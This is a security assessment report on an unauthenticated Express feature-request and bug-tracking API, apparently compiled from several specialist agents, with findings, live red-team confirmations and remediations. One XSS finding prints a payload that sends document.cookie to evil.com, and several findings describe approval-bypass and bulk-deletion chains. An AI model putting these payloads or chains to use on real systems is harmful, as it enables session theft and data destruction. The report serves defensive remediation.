Executive Summary

The application fails every security objective. The red-team confirmed all four pentest objectives as live exploits against the running environment, triggering an automatic Grade F (per grading config: "F: reserved for confirmed red-team breach of a critical objective").

The root cause is unambiguous: the entire API — every endpoint, every action — is completely unauthenticated and unauthorized. There is no JWT, no session, no API key, no role check anywhere in the request pipeline. Any actor who can reach port 3001 can create, read, update, delete, approve, reject, dispatch, or bulk-destroy data with zero credentials.

On top of this root failure, the state machine that governs feature-request approval is doubly bypassed: (1) a force-approve endpoint requires no auth and no minimum voting round, and (2) the status field is directly writable via PATCH, allowing clients to skip normal state transitions entirely. Both were confirmed live.

Compliance pass rate is 17% (2 of 12 controls partial-pass; 0 fully pass). The minimum for Grade C is 60%.

Top 3 Risks

1No authentication anywhere — anonymous actors control the entire system (C-001, confirmed live)
2State machine bypass — approve any item, skip AI voting, force any status transition (C-002, confirmed live)
3Unauthenticated bulk deletion — enumerate and permanently destroy all records with no recovery path (C-003, confirmed live)
Consolidated Findings

Critical — 3 Findings (all confirmed live)

C-001 No Authentication or Authorization on Entire API Critical Confirmed Live

The Express application has zero authentication middleware. Every endpoint — CRUD, state transitions, intake webhooks, dashboard, metrics — is accessible to any unauthenticated caller. Red-team confirmed: GET /api/feature-requests, POST /api/feature-requests, DELETE /api/feature-requests/FR-0001 all returned HTTP 200/201/204 with no Authorization header, verified across 8 route namespaces.

Sources: PEN-001 · RED-001 · SAST-001 · COMP-001 · COMP-004  |  Specialists: pen-tester · red-teamer · static-analyzer · compliance-auditor

RemediationAdd global JWT authentication middleware before all route handlers in app.ts. Implement a login endpoint that issues signed tokens. Add RBAC with requireRole() middleware per route (reader / reviewer / approver / dispatcher). Thread actor identity from token through all mutating operations.
C-002 State Machine Bypass — Multiple Paths to Approve Without Assessment Critical Confirmed Live

Chain A (PATCH shortcut): PATCH /api/feature-requests/:id accepts {"status":"voting"} directly, skipping the /vote endpoint that triggers AI agent voting. Then POST /force-approve (no auth) transitions to approved with 0 AI votes. Red-team evidence: FR-0005 reached status=approved, votes=[] after two unauthenticated requests.

Chain B (fast-track override): POST /api/work-items/:id/route with {"overrideRoute":"fast-track"} forces classification to return Approved regardless of item type, bypassing assessment entirely. No privilege check.

Sources: PEN-002 · PEN-003 · RED-002 · RED-007  |  Specialists: pen-tester · red-teamer

RemediationRemove status from PATCH-able fields — status must go through dedicated endpoints with state machine enforcement. Gate force-approve behind admin/manager role; require at least one completed voting round as precondition. Gate overrideRoute on privilege check. Add invariant tests: no item may reach approved without a changeHistory entry from the assessment pod.
C-003 Unauthenticated Bulk Data Deletion (Permanent, No Recovery) Critical Confirmed Live

DELETE /api/feature-requests/:id and DELETE /api/bugs/:id require no authentication and perform a hard delete. Red-team confirmed FR-0001 permanently destroyed with one unauthenticated request. An attacker can enumerate sequential IDs (FR-0001, FR-0002, …) and bulk-delete all data with no soft-delete buffer and no audit trail.

Sources: RED-008 · PEN-001  |  Specialists: red-teamer · pen-tester

RemediationRequire authentication on all DELETE operations (blocked by C-001 fix). Implement soft-delete with deleted_at column. Add privileged hard-purge endpoint behind admin role. Add rate limiting on DELETE routes.

High — 8 Findings (3 confirmed, 5 theoretical)

H-001 Ghost-Blocker DoS — Deleted Blocker Permanently Freezes Dependent Item High Confirmed Live

When a blocker item is deleted, dependent items' blockedBy arrays are not cleaned up. computeHasUnresolvedBlockers() returns true for undefined (deleted) blockers — treating a ghost reference identically to an active blocker. Red-team confirmed: FR-0009 permanently frozen with blocked_by: [{item_id:"FR-0008", title:"Unknown", status:"unknown"}] after FR-0008 was deleted. No API endpoint can clear this ghost reference.

Sources: PEN-006 · RED-003  |  Specialists: pen-tester · red-teamer

RemediationOn item deletion, cascade-remove all dependency edges where the item appears as a blocker. Fix computeHasUnresolvedBlockers(): treat blocker === undefined as resolved. Add a periodic dependency audit job for orphaned references.
H-002 No Pagination Enforcement — Full Dataset Extraction in Single Request High Confirmed Live

Source/Backend parses limit with no maximum cap. portal/Backend runs raw SELECT * FROM feature_requests with no LIMIT clause — no pagination contract at all. Red-team confirmed: full dataset returned in a single unauthenticated request. Enables complete data exfiltration and server resource exhaustion.

Sources: PEN-004 · RED-004 · SAST-005 · COMP-006  |  Specialists: pen-tester · red-teamer · static-analyzer · compliance-auditor

RemediationSource/Backend: const limit = Math.min(Math.max(1, parseInt(...) || 20), 100); — portal/Backend: add LIMIT/OFFSET to all SQL list queries. Return {data, total, page, limit, totalPages} for all list endpoints.
H-003 Stored XSS — HTML/Script Payloads Stored Verbatim High Confirmed Live

Free-text title and description fields have no HTML sanitization. Red-team stored <script>alert(1)</script> and <img src=x onerror="fetch('http://evil.com/'+document.cookie)"> verbatim. Both appear in GET /api/bugs listings unescaped. Any frontend rendering these without explicit HTML encoding will execute the JS.

Sources: RED-006 · PEN-012  |  Specialists: red-teamer · pen-tester

RemediationSanitize all free-text inputs server-side using isomorphic-dompurify or a strict character allowlist. Ensure frontend HTML-encodes dynamic content before DOM insertion. Add Content-Security-Policy header via helmet().
H-004 Unauthenticated Bulk Dependency Replacement via PATCH High Theoretical

PATCH /api/work-items/:id accepts {"blockedBy": []} and atomically replaces all existing dependencies, enabling any unauthenticated actor to silently clear all blockers from an approved item and force it through dispatch. Can also inject new blocker references to deny-of-service a target item.

Sources: PEN-007  |  Specialists: pen-tester

RemediationRequire authentication. Gate dependency modification behind reviewer/dispatcher role. Separate the blockedBy mutation into a dedicated, audited endpoint.
H-005 Cascade Dispatch Exploit — Force Auto-Dispatch via Reject-After-Approve High Theoretical

Rejecting a blocker triggers onItemResolved() which auto-dispatches dependents in approved status with no unresolved blockers. Combined with C-002 (unauthenticated approve), an attacker engineers a four-step chain to dispatch any item without touching the /dispatch endpoint, bypassing its team-name validation.

Sources: PEN-009  |  Specialists: pen-tester

RemediationonItemResolved() cascade dispatch must validate team name and require the same authorization checks as the explicit /dispatch endpoint.
H-006 Unauthenticated Intake Webhooks — No HMAC Verification High Theoretical

POST /api/intake/zendesk and POST /api/intake/automated accept arbitrary JSON with no signature verification. Any actor who knows the URL can inject unlimited fabricated work items or inject malicious payloads into title/description fields (see H-003).

Sources: SAST-002 · COMP-005  |  Specialists: static-analyzer · compliance-auditor

RemediationVerify X-Zendesk-Webhook-Signature HMAC-SHA256 against shared secret in env var. Add Authorization: Bearer <INTAKE_API_KEY> to /automated. Reject non-matching requests with 401.
H-007 Required SOC2 Audit Events Not Emitted High Theoretical

All four required audit events are missing: login_attempt (no auth layer), permission_denied (no authz layer), state_transition (present but uses hardcoded actor strings — not a real user identity), data_export (no log event defined). SOC2 CC7.1 requires actor-attributable audit trails.

Sources: COMP-002  |  Specialists: compliance-auditor  |  Framework: SOC2-Type2 CC7.1, OWASP-ASVS 7.2.1

RemediationCreate auditLog({event, actor, target, timestamp, outcome, ip}) function. Wire to: auth endpoint (login_attempt), auth middleware (permission_denied), workflow actions with real actor from token (state_transition), and bulk-read/export paths (data_export).
H-008 No TLS/HTTPS Enforcement High Theoretical

The application binds to a plain HTTP listener. No TLS termination, HTTP→HTTPS redirect, or HSTS header is configured in source code. No helmet is installed. All data (including any future sensitive payloads) travels unencrypted over the wire.

Sources: COMP-003  |  Specialists: compliance-auditor  |  Framework: OWASP-ASVS 9.1.1/9.1.2, SOC2-Type2 CC6.1

RemediationInstall helmet and add app.use(helmet()). Document TLS at infra layer in CLAUDE.md. Add middleware rejecting requests where X-Forwarded-Proto !== 'https' in production. Add integration test confirming Strict-Transport-Security header.

Medium — 9 Findings (1 confirmed, 8 theoretical)

M-001 Prometheus /metrics Publicly Accessible Medium Confirmed Live

GET /metrics returns full Prometheus exposition — per-route request counts, latency histograms with route labels, heap metrics — with no auth. Red-team confirmed: reveals active API routes, HTTP status distribution, and operational timing patterns useful for targeting attacks.

Sources: PEN-008 · RED-005 · SAST-006  |  Specialists: pen-tester · red-teamer · static-analyzer

RemediationRestrict to internal network via reverse proxy, or add bearer token check (METRICS_TOKEN env var), or expose on a separate non-public port.
M-002 Internal Error Messages Leaked to API Clients Medium Theoretical

Every catch block in workflow.ts serializes err.message directly into HTTP 500 response bodies. Can expose internal state, data model details, and service names. The errorHandler.ts pattern (correct: returns generic message, logs full context) is not followed by route handlers.

Sources: SAST-003  |  Specialists: static-analyzer  |  CWE-209

RemediationReplace res.status(500).json({ error: message }) with res.status(500).json({ error: 'Internal server error' }) in all catch blocks. Log full error context via logger only.
M-003 Intake Webhook Enum Validation Bypass Medium Theoretical

Intake routes use body.type || WorkItemType.Bug — any truthy but invalid string bypasses the default and is stored verbatim. The main POST /api/work-items route correctly validates enums; intake paths do not.

Sources: SAST-004 · PEN-005  |  Specialists: static-analyzer · pen-tester  |  CWE-20

RemediationAdd enum validation in both intake routes before createWorkItem(), mirroring the pattern in workItems.ts lines 29–41.
M-004 No CORS Policy / Missing Security Headers Medium Theoretical

No helmet or explicit CORS policy configured. No CSP, X-Frame-Options, X-Content-Type-Options, or HSTS headers. Red-team noted CORS rejects cross-origin browser requests on portal instance — but this is browser-level only; non-browser API callers are unaffected.

Sources: PEN-010 · SAST-007  |  Specialists: pen-tester · static-analyzer  |  CWE-693

Remediationnpm install helmet cors; add app.use(helmet()); app.use(cors({ origin: 'http://localhost:5173' })); before route registration.
M-005 Sequential Predictable Document IDs Enable Enumeration Medium Theoretical

generateDocId() produces sequential WI-001, WI-002, etc. from a monotonically increasing counter. Reveals total historical item count including deleted items. docId values appear in change history notes, revealing operational relationships.

Sources: PEN-011  |  Specialists: pen-tester  |  CWE-330

RemediationUse random suffixes for docId generation, or accept and document the information-disclosure risk.
M-006 NaN/Negative Pagination — Response Oracle Medium Theoretical

page=abc → NaN → slice(NaN,NaN) = [] — returns empty data but non-zero total, confirming item count without viewing data. page=-1 returns items from the end of the sorted array. limit=0 returns totalPages: Infinity.

Sources: PEN-013 · SAST-008  |  Specialists: pen-tester · static-analyzer  |  CWE-20

Remediationconst page = isNaN(rawPage) || rawPage < 1 ? 1 : rawPage; and const limit = Math.min(Math.max(1, rawLimit || 20), 100);
M-007 No Actor Identity in Operational Logs or Change History Medium Theoretical

Change history entries use hardcoded strings ('manual-override', 'dispatcher', 'user', 'system'). Operational logs never include userId, userEmail, or requestId. The audit trail cannot answer "who did what" — a core SOC2 CC7.1 requirement.

Sources: COMP-007  |  Specialists: compliance-auditor  |  Framework: OWASP-ASVS 7.1.1, SOC2-Type2 CC7.1

RemediationThread real actor identity from the auth token through all service calls. Add request ID middleware via AsyncLocalStorage. Replace hardcoded actor strings in buildChangeEntry calls with the authenticated user ID.
M-008 No Hard Delete / Right to Erasure Mechanism Medium Theoretical

DELETE /api/work-items/:id performs only a soft delete. Items remain in memory indefinitely. No hard-delete endpoint, no purge mechanism, no retention policy. title/description fields may contain user-entered PII in practice.

Sources: COMP-008  |  Specialists: compliance-auditor  |  Framework: GDPR Art. 17, OWASP-ASVS 8.3.4

RemediationImplement purgeWorkItem(id) removing item from the Map entirely. Expose as a privileged admin endpoint behind RBAC. Document retention policy (e.g., soft-deleted items purged after 30 days).
M-009 No Rate Limiting on Any Endpoint Medium Theoretical

No rate-limiting middleware on any route. Intake endpoints and workflow action endpoints are particularly exposed to flooding and denial of service.

Sources: COMP-009  |  Specialists: compliance-auditor  |  Framework: OWASP-ASVS 2.2.1, SOC2-Type2 CC6.1

RemediationInstall express-rate-limit. Apply global limiter (100 req/min per IP) and tighter limiter on intake and state-transition endpoints (10 req/min per IP).

Low — 2 Findings

L-001 No Length Validation on Free-Text Fields Low Confirmed (via RED-006)

title, description, and reason fields have no per-field character limit. Express's 100KB body limit partially mitigates this but doesn't prevent memory pressure from large descriptions in change history aggregation (H-002 interaction).

Sources: PEN-012  |  Specialists: pen-tester · red-teamer  |  CWE-20

RemediationAdd maxLength validation: title ≤ 200, description ≤ 10,000 chars in all creation and update routes.
L-002 No Correlation/Trace IDs in Log Entries Low Theoretical

CLAUDE.md mandates OpenTelemetry tracing with W3C traceparent propagation, but the logger emits no traceId, spanId, or requestId. Log entries cannot be correlated across a request's lifecycle, making incident investigation difficult.

Sources: COMP-010  |  Specialists: compliance-auditor  |  Framework: OWASP-ASVS 7.1.3

RemediationIntegrate @opentelemetry/sdk-node or pino serializers. Add request middleware that extracts/generates traceparent and injects traceId/spanId into all log entries via AsyncLocalStorage.

Key Discovery

The pen-tester's attack surface map targeted Source/Backend (/api/work-items); the live docker-compose target runs portal/Backend (/api/feature-requests, /api/bugs, etc.). The structural vulnerability classes — no auth, state machine bypass, ghost blocker, no pagination — are present in both codebases.

What Held
  • Bug PATCH status transitions enforce the state machine (400 for invalid jumps) in some cases
  • CORS properly rejects cross-origin browser requests from non-whitelisted origins on the portal instance
  • Orchestrator proxy unavailable in test environment — no SSRF surface confirmed
